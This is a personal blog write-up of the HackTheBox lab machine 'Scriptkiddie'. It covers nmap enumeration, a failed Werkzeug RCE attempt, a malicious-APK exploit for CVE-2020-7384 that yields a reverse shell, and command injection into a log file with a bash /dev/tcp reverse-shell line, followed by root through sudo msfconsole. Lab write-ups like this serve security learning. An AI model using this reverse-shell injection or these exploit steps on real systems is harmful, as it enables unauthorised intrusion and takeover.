---
layout: post
title: "Scriptkiddie Writeup - HackTheBox"
category: HackTheBox
---

## HTB - Scriptkiddie

Eventhough I am quiet braindead I am going to do it. 2 boxes on one day. I'll see how far I will get. Scriptkiddie is reasonably new and therefore imma try it.

### ENUM

```
root@kali:/home/kali/Desktop/HTB/machines/scriptkiddie# nmap -A 10.129.96.25 | tee firstnmap.txt
Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-11 11:45 EST
Nmap scan report for 10.129.96.25
Host is up (0.014s latency).
Not shown: 998 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 3c:65:6b:c2:df:b9:9d:62:74:27:a7:b8:a9:d3:25:2c (RSA)
|   256 b9:a1:78:5d:3c:1b:25:e0:3c:ef:67:8d:71:d3:a3:ec (ECDSA)
|_  256 8b:cf:41:82:c6:ac:ef:91:80:37:7c:c9:45:11:e8:43 (ED25519)
5000/tcp open  http    Werkzeug httpd 0.16.1 (Python 3.8.5)
|_http-title: k1d'5 h4ck3r t00l5
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.91%E=4%D=2/11%OT=22%CT=1%CU=35067%PV=Y%DS=2%DC=T%G=Y%TM=60255F3
OS:1%P=x86_64-pc-linux-gnu)SEQ(SP=101%GCD=1%ISR=10D%TI=Z%CI=Z%II=I%TS=A)OPS
OS:(O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST1
OS:1NW7%O6=M54DST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN
OS:(R=Y%DF=Y%T=40%W=FAF0%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
OS:=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 443/tcp)
HOP RTT      ADDRESS
1   15.20 ms 10.10.14.1
2   15.31 ms 10.129.96.25

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.32 seconds

```

```
root@kali:/home/kali/Desktop/HTB/machines/scriptkiddie# nmap --script=vuln 10.129.98.21 | tee secondnmap.txt
Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-15 09:19 EST
Pre-scan script results:
| broadcast-avahi-dos: 
|   Discovered hosts:
|     224.0.0.251
|   After NULL UDP avahi packet DoS (CVE-2011-1002).
|_  Hosts are all up (not vulnerable).
Nmap scan report for 10.129.98.21
Host is up (0.017s latency).
Not shown: 998 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
5000/tcp open  upnp

Nmap done: 1 IP address (1 host up) scanned in 35.40 seconds

```

A typical scriptkiddie would DoS the hell out of this machine, but I dont see any reason to create unavailabilty. So to sum it up this is the software I found during enumeration:

- broadcast-avahi (Which happens to have some kind of DoS vuln)
- OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0) on port 22
- Werkzeug httpd 0.16.1 on port 5000
- Python 3.8.5 as backend of Werkzeug

### Find the exploit 🔍

Basicly I started google-ing by the following keyword combinations:

- softwarename + softwareversion + exploit
- softwarename + softwareversion + exploit + github
- softwarename + softwareversion + github
- softwarename + softwareversion + exploitdb
- softwarename + softwareversion + exploit + exploitdb
- softwarename + softwareversion
    I also tried to utilize searchsploit, a tool that basicly is a CLI version of exploitDB.

#### OpenSSH 8.2p1

No exploits found.

#### Werkzeug httpd 0.16.1

- [This exploit which is not per se for this werkzeug version](https://github.com/its-arun/Werkzeug-Debug-RCE)

#### python 3.8.5

- [This page of CVE's looks promising](https://www.cybersecurity-help.cz/vdb/python_org/python/3.8.5/)
- None exploits found :(

Lets just work with the things I have.

### Exploitation galore 🔥

I decided to jump straight into exploitation since I had a severe lack of brainactivity during this box. Found [this](https://github.com/its-arun/Werkzeug-Debug-RCE) exploit and this was the result:

```
root@kali:/home/kali/Desktop/HTB/machines/scriptkiddie# python werkzeug.py 10.129.96.25:5000 whoami
/usr/share/offsec-awae-wheels/pyOpenSSL-19.1.0-py2.py3-none-any.whl/OpenSSL/crypto.py:12: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support for it is now deprecated in cryptography, and will be removed in the next release.
[-] Debug is not enabled
```

Same problem with MSF:


```
root@kali:/home/kali/Desktop/HTB/machines/scriptkiddie# msfconsole
                                                  

                 _---------.
             .' #######   ;."
  .---,.    ;@             @@`;   .---,..
." @@@@@'.,'@@            @@@@@',.'@@@@ ".
'-.@@@@@@@@@@@@@          @@@@@@@@@@@@@ @;
   `.@@@@@@@@@@@@        @@@@@@@@@@@@@@ .'
     "--'.@@@  -.@        @ ,'-   .'--"
          ".@' ; @       @ `.  ;'
            |@@@@ @@@     @    .
             ' @@@ @@   @@    ,
              `.@@@@    @@   .
                ',@@     @   ;           _____________
                 (   3 C    )     /|___ / Metasploit! \
                 ;@'. __*__,."    \|--- \_____________/
                  '(.,...."/


       =[ metasploit v6.0.29-dev                          ]
+ -- --=[ 2098 exploits - 1129 auxiliary - 357 post       ]
+ -- --=[ 592 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 7 evasion                                       ]

Metasploit tip: Enable verbose logging with set VERBOSE 
true

msf6 > use exploit/multi/http/werkzeug_debug_rce
[*] No payload configured, defaulting to python/meterpreter/reverse_tcp
msf6 exploit(multi/http/werkzeug_debug_rce) > show targets

Exploit targets:

   Id  Name
   --  ----
   0   werkzeug 0.10 and older


msf6 exploit(multi/http/werkzeug_debug_rce) > show options

Module options (exploit/multi/http/werkzeug_debug_rce):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /console         yes       URI to the console
   VHOST                       no        HTTP server virtual host


Payload options (python/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.44.135   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   werkzeug 0.10 and older


msf6 exploit(multi/http/werkzeug_debug_rce) > set RHOSTS 10.129.96.25
RHOSTS => 10.129.96.25
msf6 exploit(multi/http/werkzeug_debug_rce) > set RPORT 5000
RPORT => 5000
msf6 exploit(multi/http/werkzeug_debug_rce) > set LHOST 10.10.14.33
LHOST => 10.10.14.33
msf6 exploit(multi/http/werkzeug_debug_rce) > exploit

[-] Handler failed to bind to 10.10.14.33:4444:-  -
[-] Handler failed to bind to 0.0.0.0:4444:-  -
[-] Exploit failed [bad-config]: Rex::BindFailed The address is already in use or unavailable: (0.0.0.0:4444).
[*] Exploit completed, but no session was created.
msf6 exploit(multi/http/werkzeug_debug_rce) > set LPORT 4343
LPORT => 4343
msf6 exploit(multi/http/werkzeug_debug_rce) > exploit

[*] Started reverse TCP handler on 10.10.14.33:4343 
[-] Secret code not detected.
[*] Exploit completed, but no session was created.
msf6 exploit(multi/http/werkzeug_debug_rce) > 

```

Therefore I focussed on the content of the webserver and SSH that was open. First the webserver. There are three input fields, one selection dropdown and an upload button. The first input box did not raise any hopes since all I could do with it is insert an IP for a local nmap scan, so I tried localhost in hopes of getting more info, but no I did not really.

The last inputbox was kinda interesting since it uses searchsploit, and the only thing I have to put in is a keyword for that tool, so I tried to concatnate command in such a fashion:



```
Search: yeet && whoami
```


Though the maker of this box are not born yesterday so the feedback of the server was as following:

```
> #### stop hacking me - well hack you back
```

Thats when I decided to see what the upload button does. It has the following text above it:

> #### venom it up - gen rev tcp meterpreter bins


That made me think of msfvenom, the dropdown gave me options for linux, windows and android. So after some googling I found [this vulnerabilty](https://nvd.nist.gov/vuln/detail/CVE-2020-7384). Which is followed up by [this exploit.](https://github.com/nikhil1232/CVE-2020-7384) So I gave the exploit a try, make sure you install openjdk-11-jdk via apt:

```
root@kali:/home/kali/Desktop/HTB/machines/scriptkiddie# bash ./CVE-2020-7384.sh

CVE-2020-7384

Enter the LHOST: 
10.10.14.35

Enter the LPORT: 
7070

Select the payload type
1. nc
2. bash
3. python
4. python3

select: 1

Enter the Directory (absolute path) where you would like to save the apk file (Hit Enter to use the current directory): 

  adding: emptyfile (stored 0%)
jar signed.

Warning: 
The signer's certificate is self-signed.
The SHA1 algorithm specified for the -digestalg option is considered a security risk. This algorithm will be disabled in a future update.
The SHA1withRSA algorithm specified for the -sigalg option is considered a security risk. This algorithm will be disabled in a future update.
POSIX file permission and/or symlink attributes detected. These attributes are ignored when signing and are not protected by the signature.

New APK file Generated
Location: "/home/kali/Desktop/HTB/machines/scriptkiddie/exploit.apk"

The APK file generated could be now uploaded or used for exploitation

If you have access to the vulnerable machine then run:
msfvenom -x <your newly created apk> -p android/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -o /dev/null

root@kali:/home/kali/Desktop/HTB/machines/scriptkiddie#
```

Start a netact listening session on your host machine, and upload the APK under android selected to the webserver, and before you know magic happens:

```
root@kali:/home/kali# nc -lvp 7070
listening on [any] 7070 ...
10.129.98.21: inverse host lookup failed: Unknown host
connect to [10.10.14.35] from (UNKNOWN) [10.129.98.21] 37670
ls
__pycache__
app.py
static
templates
whoami
kid
pwd
/home/kid/html
cd ..
pwd
/home/kid
ls
html
logs
snap
user.txt
```

So now I have the user flag. Lets see if I can get the root flag somehow. Earlier 2021 revealed a sudo privesc vuln [which can be read more about here](https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt). You can check if the system you are testing is vulnerable with a one liner. If your system returns something like the output of a help page/usage manual then it is not vulnerable for this exploit. Anyways here is my output:


```
sudo --version
Sudo version 1.8.31
Sudoers policy plugin version 1.8.31
Sudoers file grammar version 46
Sudoers I/O plugin version 1.8.31
sudoedit -s '\' `perl -e 'print "A" x 65536'`
usage: sudoedit [-AknS] [-r role] [-t type] [-C num] [-g group] [-h host] [-p
                prompt] [-T timeout] [-u user] file ...

```
Sadly this exploit did not work, but no worries. I first tried to figure out of this device is connected to the internet. Which it wasnt, so I set up a simplehttpserver on my host machine, transferred [linpeass](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) to scriptkiddie and ran it there. The output gave me some options:

- An application was installed called Snap/LXD which gives root to /index
- .msf4 folder which stands for metasploit4
- Various SUID's which I needed a password for
- And some HTB-forum users which suggested that you must in practice own three users to complete this box.

Namely this last point was of importance, one user I already owned (kid) the last one is root. An ls -al in /home revealed a user called pwn. This users home folder contains one of the scripts used in the webserver to run the NMAP command:

```
#!/bin/bash

log=/home/kid/logs/hackers

cd /home/pwn/
cat $log | cut -d' ' -f3- | sort -u | while read ip; do
    sh -c "nmap --top-ports 10 -oN recon/${ip}.nmap ${ip} 2>&1 >/dev/null" &
done

if [[ $(wc -l < $log) -gt 0 ]]; then echo -n > $log; fi

```
Long story short; this script sets a variable for a file called /home/kid/logs/hackers which is assigned to user kid and group pwn. the script navigates to the folder /home/pwn, reads the log variable, splits it on space as delimiter and parses the third collumn. Executes the nmap command and if there is an error the output get thrown into the void @ /dev/null. Last but ot least it clears the contents of /home/kid/logs/hackers.

So now I gotta find a way to exploit the way it reads the file called hackers. Maybe I am able to start a reverse shell by concatnating commands. So I did this as user kid:
```
echo "  ;/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.35/6666 0>&1' #" > /home/kid/logs/hackers

```

Set up a netcat listening session and just like that I had a shell as user pwn:

```
root@kali:/home/kali/Desktop/HTB/machines/scriptkiddie# nc -lvp 6666
listening on [any] 6666 ...
10.129.98.83: inverse host lookup failed: Unknown host
connect to [10.10.14.35] from (UNKNOWN) [10.129.98.83] 53454
bash: cannot set terminal process group (830): Inappropriate ioctl for device
bash: no job control in this shell
pwn@scriptkiddie:~$ 


```

run metasploit and ran sudo -L:

```
msf6 > sudo -l                                                                 
sudo -l
[*] exec: sudo -l

Matching Defaults entries for pwn on scriptkiddie:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User pwn may run the following commands on scriptkiddie:
    (root) NOPASSWD: /opt/metasploit-framework-6.0.9/msfconsole
msf6 > exit()                                                                  
exit()
[-] Unknown command: exit().
msf6 > exit                                                                    
exit
pwn@scriptkiddie:~$ sudo /opt/metasploit-framework-6.0.9/msfconsole
sudo /opt/metasploit-framework-6.0.9/msfconsole
                                                  
                                   ___          ____
                               ,-""   `.      < HONK >
                             ,'  _   e )`-._ /  ----
                            /  ,' `-._<.===-'
                           /  /
                          /  ;
              _          /   ;
 (`._    _.-"" ""--..__,'    |
 <_  `-""                     \
  <`-                          :
   (__   <__.                  ;
     `-.   '-.__.      _.'    /
        \      `-.__,-'    _,'
         `._    ,    /__,-'
            ""._\__,'< <____
                 | |  `----.`.
                 | |        \ `.
                 ; |___      \-``
                 \   --<
                  `.`.<
                    `-'



       =[ metasploit v6.0.9-dev                           ]
+ -- --=[ 2069 exploits - 1122 auxiliary - 352 post       ]
+ -- --=[ 592 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 7 evasion                                       ]

Metasploit tip: View a module's description using info, or the enhanced version in your browser with info -d

stty: 'standard input': Inappropriate ioctl for device
stty: 'standard input': Inappropriate ioctl for device
stty: 'standard input': Inappropriate ioctl for device
stty: 'standard input': Inappropriate ioctl for device
stty: 'standard input': Inappropriate ioctl for device
stty: 'standard input': Inappropriate ioctl for device
stty: 'standard input': Inappropriate ioctl for device
msf6 > whoami
stty: 'standard input': Inappropriate ioctl for device
[*] exec: whoami

root
stty: 'standard input': Inappropriate ioctl for device
stty: 'standard input': Inappropriate ioctl for device
stty: 'standard input': Inappropriate ioctl for device
stty: 'standard input': Inappropriate ioctl for device
stty: 'standard input': Inappropriate ioctl for device
msf6 > 


```

cd /root that shit and you can cat the flag. I did not enjoy the last bit of this box. 6/10 for its complexity and unneeded use of bizare shell creation methods. I was very optimistic doing two boxes in one day. Imma go to sleep 
